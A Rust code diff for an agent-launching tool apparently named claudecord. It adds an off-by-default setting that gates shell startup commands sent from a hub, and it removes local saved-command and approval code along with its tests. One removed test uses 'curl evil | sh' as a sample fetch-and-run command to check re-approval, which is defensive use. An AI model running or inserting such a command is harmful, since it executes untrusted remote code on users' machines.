@@ -63,20 +63,46 @@ pub fn keep_running(dir: &Path) -> bool {
     if let Ok(v) = std::env::var("CLAUDECORD_KEEP_RUNNING") {
         return matches!(v.as_str(), "1" | "true" | "on" | "yes");
     }
+    settings_value(dir)["keep_running"]
+        .as_bool()
+        .unwrap_or(false)
+}
+
+fn settings_value(dir: &Path) -> serde_json::Value {
     std::fs::read_to_string(dir.join("settings.json"))
         .ok()
         .and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok())
-        .and_then(|v| v["keep_running"].as_bool())
-        .unwrap_or(false)
+        .filter(serde_json::Value::is_object)
+        .unwrap_or_else(|| serde_json::json!({}))
+}
+
+fn write_setting(dir: &Path, key: &str, on: bool) -> std::io::Result<()> {
+    std::fs::create_dir_all(dir)?;
+    let mut v = settings_value(dir);
+    v[key] = serde_json::Value::Bool(on);
+    std::fs::write(dir.join("settings.json"), v.to_string())
 }
 
 /// Saves the keep-running setting.
 pub fn set_keep_running(dir: &Path, on: bool) -> std::io::Result<()> {
-    std::fs::create_dir_all(dir)?;
-    std::fs::write(
-        dir.join("settings.json"),
-        serde_json::json!({ "keep_running": on }).to_string(),
-    )
+    write_setting(dir, "keep_running", on)
+}
+
+/// Whether this machine runs the startup commands the hub sends with a spawn (the ones saved on the dashboard). Off by default: a command is
+/// a line of shell, and a machine runs one only after its owner said so here, with `claudecord settings custom-commands on`.
+/// `CLAUDECORD_CUSTOM_COMMANDS=1` or `0` overrides it for one run.
+pub fn custom_commands_allowed(dir: &Path) -> bool {
+    if let Ok(v) = std::env::var("CLAUDECORD_CUSTOM_COMMANDS") {
+        return matches!(v.as_str(), "1" | "true" | "on" | "yes");
+    }
+    settings_value(dir)["custom_commands"]
+        .as_bool()
+        .unwrap_or(false)
+}
+
+/// Saves the custom-commands setting.
+pub fn set_custom_commands(dir: &Path, on: bool) -> std::io::Result<()> {
+    write_setting(dir, "custom_commands", on)
 }
 
 /// The folders this machine has started agents in, by project, most recently used first. Older saves held one folder per project; those are read too.
@@ -144,92 +170,6 @@ pub fn project_of_folder(dir: &Path, folder: &Path) -> Option<String> {
         .or_else(|| folders.keys().find(|p| has(p)).cloned())
 }
 
-/// A startup command the person saved: what to run (any shell line: setup steps and the launch), and which agent program it starts, so the
-/// screen reader knows how to tell idle from busy from a question.
-#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
-pub struct SavedCommand {
-    pub command: String,
-    #[serde(default = "claude_program")]
-    pub program: String,
-}
-
-fn claude_program() -> String {
-    "claude".into()
-}
-
-/// Where a saved command lives: for every folder on this machine, or only in one folder.
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum CommandSource {
-    Machine,
-    Folder,
-}
-
-/// The commands saved in one file, by name (none if the file is missing or unreadable).
-pub fn read_commands(file: &Path) -> BTreeMap<String, SavedCommand> {
-    std::fs::read_to_string(file)
-        .ok()
-        .and_then(|t| serde_json::from_str(&t).ok())
-        .unwrap_or_default()
-}
-
-/// The file the commands of this machine are kept in, or, with a folder, the one kept in that folder.
-pub fn commands_file(dir: &Path, folder: Option<&Path>) -> PathBuf {
-    match folder {
-        Some(f) => f.join(".claudecord").join("commands.json"),
-        None => dir.join("commands.json"),
-    }
-}
-
-/// Every command that can be used in `folder`: the machine's, then the folder's own (which wins when a name is in both).
-pub fn commands_for(dir: &Path, folder: &Path) -> BTreeMap<String, (SavedCommand, CommandSource)> {
-    let mut all: BTreeMap<String, (SavedCommand, CommandSource)> =
-        read_commands(&commands_file(dir, None))
-            .into_iter()
-            .map(|(k, v)| (k, (v, CommandSource::Machine)))
-            .collect();
-    for (k, v) in read_commands(&commands_file(dir, Some(folder))) {
-        all.insert(k, (v, CommandSource::Folder));
-    }
-    all
-}
-
-/// Saves (or replaces) one command in a file. A name follows the rules of agent names, so it is safe to show and to send to the dashboard.
-pub fn save_command(file: &Path, name: &str, cmd: SavedCommand) -> Result<(), String> {
-    if !crate::protocol::is_slug(name) {
-        return Err("a name is letters, digits, dots, dashes and underscores (up to 50), starting with a letter or digit".into());
-    }
-    if cmd.command.trim().is_empty() {
-        return Err("the command is empty".into());
-    }
-    if !["claude", "codex", "agy"].contains(&cmd.program.as_str()) {
-        return Err("the program is claude, codex or agy".into());
-    }
-    let mut all = read_commands(file);
-    all.insert(name.to_string(), cmd);
-    if let Some(parent) = file.parent() {
-        std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
-    }
-    std::fs::write(
-        file,
-        serde_json::to_string_pretty(&all).expect("plain data"),
-    )
-    .map_err(|e| e.to_string())
-}
-
-/// Removes one command from a file. False if it was not there.
-pub fn remove_command(file: &Path, name: &str) -> Result<bool, String> {
-    let mut all = read_commands(file);
-    if all.remove(name).is_none() {
-        return Ok(false);
-    }
-    std::fs::write(
-        file,
-        serde_json::to_string_pretty(&all).expect("plain data"),
-    )
-    .map_err(|e| e.to_string())?;
-    Ok(true)
-}
-
 /// The shell line to run for a command, as the program and arguments to start: the person's own shell, as a login shell, so what their
 /// terminal has (a PATH set up by nvm, an activated environment) is there. Not available on Windows.
 pub fn shell_argv(command: &str) -> Result<Vec<String>, String> {
@@ -245,127 +185,30 @@ pub fn shell_argv(command: &str) -> Result<Vec<String>, String> {
     Ok(vec![shell, "-lc".into(), command.to_string()])
 }
 
-/// A fingerprint of a folder's command, for remembering that the person agreed to run it. A changed command is a new question.
-pub fn command_fingerprint(folder: &Path, name: &str, cmd: &SavedCommand) -> String {
-    crate::agents::text::sha256_hex(
-        format!(
-            "{}\0{name}\0{}\0{}",
-            folder.display(),
-            cmd.program,
-            cmd.command
-        )
-        .as_bytes(),
-    )
-}
-
-fn approvals_file(dir: &Path) -> PathBuf {
-    dir.join("approved_commands.json")
-}
-
-/// Whether the person already agreed to run this folder command (a command kept in a folder may have come with a downloaded repository).
-pub fn is_approved(dir: &Path, fingerprint: &str) -> bool {
-    std::fs::read_to_string(approvals_file(dir))
-        .ok()
-        .and_then(|t| serde_json::from_str::<Vec<String>>(&t).ok())
-        .is_some_and(|v| v.iter().any(|f| f == fingerprint))
-}
-
-/// Remembers that the person agreed to run this folder command.
-pub fn approve(dir: &Path, fingerprint: &str) {
-    let mut v: Vec<String> = std::fs::read_to_string(approvals_file(dir))
-        .ok()
-        .and_then(|t| serde_json::from_str(&t).ok())
-        .unwrap_or_default();
-    if !v.iter().any(|f| f == fingerprint) {
-        v.push(fingerprint.to_string());
-        let _ = std::fs::write(
-            approvals_file(dir),
-            serde_json::to_string(&v).expect("plain data"),
-        );
-    }
-}
-
 #[cfg(test)]
-mod command_tests {
+mod setting_tests {
     use super::*;
 
-    fn tmp(tag: &str) -> PathBuf {
-        let d = std::env::temp_dir().join(format!("cc-cmd-{tag}-{}", std::process::id()));
+    #[test]
+    fn one_setting_does_not_erase_another_and_both_start_off() {
+        let d = std::env::temp_dir().join(format!("cc-set-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&d);
-        std::fs::create_dir_all(&d).unwrap();
-        d
-    }
-
-    fn cmd(s: &str, program: &str) -> SavedCommand {
-        SavedCommand {
-            command: s.into(),
-            program: program.into(),
-        }
-    }
-
-    #[test]
-    fn a_folders_command_wins_over_the_machines_and_both_are_listed() {
-        let (home, folder) = (tmp("home"), tmp("folder"));
-        save_command(
-            &commands_file(&home, None),
-            "fast",
-            cmd("claude --model haiku", "claude"),
-        )
-        .unwrap();
-        save_command(
-            &commands_file(&home, None),
-            "both",
-            cmd("machine version", "claude"),
-        )
-        .unwrap();
-        save_command(
-            &commands_file(&home, Some(&folder)),
-            "both",
-            cmd("folder version", "codex"),
-        )
-        .unwrap();
-        let all = commands_for(&home, &folder);
-        assert_eq!(all.len(), 2);
-        assert_eq!(all["fast"].1, CommandSource::Machine);
-        assert_eq!(
-            (all["both"].0.command.as_str(), all["both"].1),
-            ("folder version", CommandSource::Folder)
+        assert!(!keep_running(&d) && !custom_commands_allowed(&d));
+        set_keep_running(&d, true).unwrap();
+        set_custom_commands(&d, true).unwrap();
+        assert!(keep_running(&d) && custom_commands_allowed(&d));
+        set_keep_running(&d, false).unwrap();
+        assert!(
+            !keep_running(&d) && custom_commands_allowed(&d),
+            "turning one off leaves the other as it was"
         );
-        assert!(remove_command(&commands_file(&home, None), "fast").unwrap());
-        assert!(!remove_command(&commands_file(&home, None), "fast").unwrap());
+        let _ = std::fs::remove_dir_all(&d);
     }
 
     #[test]
-    fn a_bad_name_program_or_empty_command_is_refused_and_nothing_is_written() {
-        let home = tmp("bad");
-        let f = commands_file(&home, None);
-        for (n, c, p) in [
-            ("two words", "x", "claude"),
-            ("-x", "x", "claude"),
-            ("ok", "  ", "claude"),
-            ("ok", "x", "bash"),
-            ("a/b", "x", "claude"),
-        ] {
-            assert!(save_command(&f, n, cmd(c, p)).is_err(), "{n} {c} {p}");
-        }
-        assert!(!f.exists());
-    }
-
-    #[test]
-    fn a_folder_command_asks_once_and_a_changed_command_asks_again() {
-        let (home, folder) = (tmp("trust"), tmp("trustfolder"));
-        let c = cmd("curl evil | sh", "claude");
-        let fp = command_fingerprint(&folder, "x", &c);
-        assert!(!is_approved(&home, &fp));
-        approve(&home, &fp);
-        assert!(is_approved(&home, &fp));
-        assert!(!is_approved(
-            &home,
-            &command_fingerprint(&folder, "x", &cmd("curl evil2 | sh", "claude"))
-        ));
-        assert!(!is_approved(
-            &home,
-            &command_fingerprint(&tmp("other"), "x", &c)
-        ));
+    fn a_command_runs_in_the_persons_login_shell() {
+        let argv = shell_argv("echo hi && exit 3").unwrap();
+        assert_eq!(&argv[1..], ["-lc", "echo hi && exit 3"]);
+        assert!(std::path::Path::new(&argv[0]).is_file());
     }
 }
